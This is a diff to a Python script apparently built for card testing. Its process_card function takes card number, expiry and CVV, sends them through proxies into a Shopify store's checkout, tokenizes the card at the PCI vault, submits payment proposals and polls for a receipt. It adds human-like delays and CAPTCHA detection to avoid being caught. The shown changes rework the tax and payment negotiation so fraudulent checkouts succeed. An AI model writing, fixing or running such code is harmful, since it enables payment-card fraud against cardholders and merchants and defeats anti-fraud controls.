+                            checkout_total_currency = tax_parsed['checkout_total_currency']
+                        if tax_parsed['tax_total'] and tax_parsed['tax_total'] != '0':
+                            tax_total = tax_parsed['tax_total']
+                        if tax_parsed['payment_method_identifier']:
+                            payment_method_identifier = tax_parsed['payment_method_identifier']
+                        if tax_parsed['stable_ids']:
+                            stable_ids = tax_parsed['stable_ids']
+
+                        print(f'[TAX_ACCEPT] result_type={tax_parsed["result_type"]} checkout_total={checkout_total} tax={tax_total}', file=sys.stderr)
+
+                        # Check for checkpoint
+                        for err in tax_parsed['errors']:
+                            if err.get('code') == 'CHECKPOINT_BLOCKED':
+                                return False, "CAPTCHA_BLOCK", gateway, total_price, currency
+
+                    except (json.JSONDecodeError, KeyError, TypeError) as e:
+                        print(f'[TAX_ACCEPT] Parse error: {e}', file=sys.stderr)
+
+                await human_delay(step_name="tax_accept")
+
+            # Calculate total price from checkout_total if available
+            if checkout_total and checkout_total != '0':
+                total_price = checkout_total
+                currency = checkout_total_currency
+            else:
+                # Fallback: estimate from price + tax
+                try:
+                    _price_float = float(price) if price else 0
+                    _tax_float = float(tax_total) if tax_total else 0
+                    total_price = f"{_price_float + _tax_float:.2f}"
+                except (ValueError, TypeError):
+                    total_price = f"{price}" if price else "0.01"
+
+            # ======== STEP 9: PCI VAULT — tokenize card ========
             pci_vault_url = 'https://checkout.pci.shopifyinc.com/sessions'
 
             _raw_cc = cc.replace(' ', '').replace('-', '')
@@ -1398,19 +1707,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if not sessionid:
                 return False, "PCI_VAULT_BLOCKED: Could not tokenize card", gateway, total_price, currency
 
-            print(f'[STEP7] pci_sessionid={sessionid[:20]}...', file=sys.stderr)
+            print(f'[STEP9] pci_sessionid={sessionid[:20]}...', file=sys.stderr)
 
             await human_delay(step_name="pci_vault")
 
-            # ======== STEP 8: PROPOSAL 2 — Full payment proposal ========
-            # Now we send the COMPLETE purchase proposal with:
-            # - buyer identity (email, address)
-            # - delivery (selected shipping strategy)
-            # - payment (tokenized card + billing address)
-            # - tax (from seller's proposal)
-            # The key fix: we use the SELLER's checkoutTotal and tax amounts,
-            # not our own estimates. This avoids PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT.
-
+            # ======== STEP 10: NEGOTIATE WITH PAYMENT ========
+            # Now we add the payment to the negotiation. This is a SEPARATE step
+            # from the merchandise+delivery negotiation (step 6).
+            
             # If paymentMethodIdentifier wasn't found from seller proposal, try extraction from checkout page
             if not payment_method_identifier:
                 paymentMethodIdentifier = (
@@ -1430,96 +1734,28 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if _sid:
                     stable_ids = [_sid]
 
-            # Calculate total price from checkout_total if available
-            # The SELLER's checkoutTotal is the AUTHORITATIVE amount
-            if checkout_total and checkout_total != '0':
-                total_price = checkout_total
-                currency = checkout_total_currency
-            else:
-                # Fallback: estimate from price + shipping + tax
-                try:
-                    _price_float = float(price) if price else 0
-                    _shipping_float = float(selected_shipping_amount) if selected_shipping_amount else 0
-                    _tax_float = float(tax_total) if tax_total else 0
-                    total_price = f"{_price_float + _shipping_float + _tax_float:.2f}"
-                except (ValueError, TypeError):
-                    total_price = f"{price}" if price else "0.01"
-
-            # Ensure we use the stable_ids from the negotiation
+            # Ensure we have stable_ids for delivery terms
             if not stable_ids:
                 stable_ids = ['1']  # Fallback
 
+            # Update delivery terms with stable_ids for no-shipping case
+            if not is_shipping_required and stable_ids:
+                delivery_terms = _build_delivery_terms(
+                    delivery_lines=[],
+                    no_delivery_required=[{'stableId': sid} for sid in stable_ids],
+                )
+
             attempt_token = str(uuid.uuid4())
 
-            # Build delivery line for Proposal 2
-            # DeliveryLineInput fields (from schema errors):
-            # - targetMerchandiseLines (REQUIRED, not null)
-            # - expectedTotalPrice (REQUIRED, not null)  
-            # - deliveryMethodTypes
-            # - selectedDeliveryStrategy
-            # - destinationChanged
-            # NOTE: destinationAddress is NOT a field on DeliveryLineInput!
-            if selected_dmt != 'NONE' and is_shipping_required:
-                delivery_line = {
-                    'targetMerchandiseLines': {
-                        'lines': [{'stableId': sid} for sid in stable_ids],
-                    },
-                    'deliveryMethodTypes': [selected_dmt],
-                    'selectedDeliveryStrategy': {
-                        'deliveryStrategyByHandle': {
-                            'handle': selected_handle,
-                            'customDeliveryRate': False,
-                        },
-                        'options': {'phone': phone},
-                    } if selected_handle else {
-                        'deliveryStrategyMatchingConditions': {
-                            'estimatedTimeInTransit': {'any': True},
-                            'shipments': {'any': True},
-                        },
-                        'options': {'phone': phone},
-                    },
-                    'expectedTotalPrice': {
-                        'value': {
-                            'amount': selected_shipping_amount,
-                            'currencyCode': currency,
-                        },
-                    },
-                    'destinationChanged': False,
-                }
-                delivery_lines_list = [delivery_line]
-                no_delivery_required = []
-            else:
-                delivery_lines_list = []
-                no_delivery_required = [{'stableId': sid for sid in stable_ids}]
-
-            # Build the complete Proposal 2 input
-            proposal2_input = {
+            # Build the complete payment negotiate input
+            payment_proposal_input = {
                 'purchaseProposal': {
                     'merchandise': {
-                        'merchandiseLines': [{
-                            'merchandise': {
-                                'stableId': stable_ids[0] if stable_ids else '1',
-                            },
-                            'quantity': {
-                                'items': {'value': 1},
-                            },
-                            'expectedTotalPrice': {
-                                'value': {
-                                    'amount': f'{price:.2f}' if price else '5.00',
-                                    'currencyCode': currency,
-                                },
-                            },
-                        }],
+                        'merchandiseLines': [merch_line],
                     },
-                    'delivery': {
-                        'deliveryLines': delivery_lines_list,
-                        'noDeliveryRequired': no_delivery_required,
-                        'useProgressiveRates': False,
-                        'prefetchShippingRatesStrategy': None,
-                        'supportsSplitShipping': True,
-                    },
+                    'delivery': delivery_terms,
                     'payment': {
-                        'totalAmount': {'any': True},
+                        'totalAmount': {'value': {'amount': f'{total_price}', 'currencyCode': currency}},
                         'paymentLines': [{
                             'paymentMethod': {
                                 'directPaymentMethod': {
@@ -1527,13 +1763,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     'sessionId': sessionid,
                                     'billingAddress': {
                                         'streetAddress': {
-                                            'address1': street,
-                                            'city': city,
-                                            'countryCode': country_code,
-                                            'postalCode': s_zip,
                                             'firstName': firstName,
                                             'lastName': lastName,
+                                            'address1': street,
+                                            'address2': '',
+                                            'city': city,
+                                            'countryCode': country_code,
                                             'zoneCode': state,
+                                            'postalCode': s_zip,
                                             'phone': phone,
                                         },
                                     },
@@ -1564,13 +1801,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         }],
                         'billingAddress': {
                             'streetAddress': {
-                                'address1': street,
-                                'city': city,
-                                'countryCode': country_code,
-                                'postalCode': s_zip,
                                 'firstName': firstName,
                                 'lastName': lastName,
+                                'address1': street,
+                                'address2': '',
+                                'city': city,
+                                'countryCode': country_code,
                                 'zoneCode': state,
+                                'postalCode': s_zip,
                                 'phone': phone,
                             },
                         },
@@ -1592,10 +1830,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'taxes': {
                         'proposedAllocations': None,
                         'proposedTotalAmount': {
-                            'value': {
-                                'amount': f'{tax_total}',
-                                'currencyCode': currency,
-                            },
+                            'any': True,
                         },
                         'proposedTotalIncludedAmount': None,
                         'proposedMixedStateTotalAmount': None,
@@ -1620,10 +1855,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'checkpointData': '',
             }
 
-            proposal2_data = {
+            payment_proposal_data = {
                 'query': QUERY_PROPOSAL,
                 'variables': {
-                    'input': proposal2_input,
+                    'input': payment_proposal_input,
                 },
                 'operationName': 'Proposal',
             }
@@ -1633,10 +1868,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     graphql_url,
                     params={'operationName': 'Proposal'},
                     headers=checkout_web_headers,
-                    json=proposal2_data,
+                    json=payment_proposal_data,
                     proxy=proxy, timeout=20, allow_redirects=True
                 ),
-                step_name="proposal2", max_retries=2, base_delay=3.0, max_delay=12.0
+                step_name="proposal2_payment", max_retries=2, base_delay=3.0, max_delay=12.0
             )
 
             if not p2_resp or p2_resp.status_code != 200:
@@ -1650,7 +1885,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             _refresh_session_token(p2_resp)
 
-            # Parse Proposal 2
+            # Parse Proposal 2 (payment)
             try:
                 p2_json = json.loads(p2_text)
                 p2_parsed = _parse_negotiate_response(p2_json)
@@ -1706,15 +1941,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             await human_delay(step_name="proposal2")
 
-            # ======== STEP 9: submitForCompletion ========
+            # ======== STEP 11: submitForCompletion ========
             if not receipt_id:
                 # Build NegotiationInput for submitForCompletion.
                 # Unlike SessionNegotiationInput (negotiate query), NegotiationInput:
                 # - Does NOT use purchaseProposal wrapper
                 # - Has fields directly: merchandise, delivery, payment, buyerIdentity, etc.
                 # - Requires sessionInput: {sessionToken: "..."}
-                # - Does NOT require queueToken at top level (it's optional)
-                pp = proposal2_input.get('purchaseProposal', proposal2_input)
+                # - Has queueToken at top level
+                pp = payment_proposal_input.get('purchaseProposal', payment_proposal_input)
                 submit_input = {
                     'sessionInput': {'sessionToken': x_checkout_one_session_token},
                     'merchandise': pp.get('merchandise'),
@@ -1844,9 +2079,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 except (json.JSONDecodeError, KeyError, TypeError) as e:
                     return False, f"SUBMIT_JSON_ERROR: {str(e)}", gateway, total_price, currency
 
-            print(f'[STEP9] receipt_id={receipt_id} total_price={total_price}', file=sys.stderr)
+            print(f'[STEP11] receipt_id={receipt_id} total_price={total_price}', file=sys.stderr)
 
-            # ======== STEP 10: PollForReceipt ========
+            # ======== STEP 12: PollForReceipt ========
             await human_delay(min_sec=1.0, max_sec=2.0, step_name="poll_start")
 
             poll_data = {
